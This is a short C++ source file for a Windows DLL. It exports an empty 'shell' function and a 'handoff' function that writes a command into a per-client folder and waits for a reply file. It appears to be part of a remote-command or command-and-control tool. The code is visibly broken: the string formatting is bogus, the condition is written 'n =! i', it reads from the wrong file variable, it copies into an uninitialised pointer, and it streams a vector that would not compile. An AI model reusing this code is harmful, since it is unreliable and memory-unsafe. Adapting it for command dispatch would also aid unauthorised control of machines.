#include <Windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>

namespace fs = std::filesystem;

extern "C" __declspec(dllexport) char *shell(char *command){

}

extern "C" __declspec(dllexport) char *handoff( std::vector<std::string> PreProcessedCommand, char *client){
    std::string file = "CLIENTS\\%s\\command.txt", client;
    std::ofstream myFile(file);
    std::string line;
    
    if(myFile.is_open()){
        myFile << PreProcessedCommand;
        myFile.close();
    }
    else {
        std::cerr << "Error: Could not open the file." << std::endl;
        return "Could not open the file";
    }

    std::string path = "CLIENTS\\%s", client;
    int i = 0;
    int n = 0;
    bool resp = false;
    std::string retpath = "%s\\ret.txt", path;
    std::ifstream filee(retpath);
    for (const auto & entry : fs::directory_iterator(path)){
        i++;
    }

    do{
        for (const auto & entry : fs::directory_iterator(path)){
            n++;
        }
        if(n =! i){
            if (filee.is_open()) {
                while (getline(file, line)) {
                    std::string retvar = line;
                    char *reternval;
                    strcpy(reternval, retvar.c_str());
                    return reternval;
                }
                filee.close(); // Close file
            }else {
                std::cerr << "Unable to open file" << std::endl;
            }
            resp = true;
        }
    }while(!resp);

    return "error";
}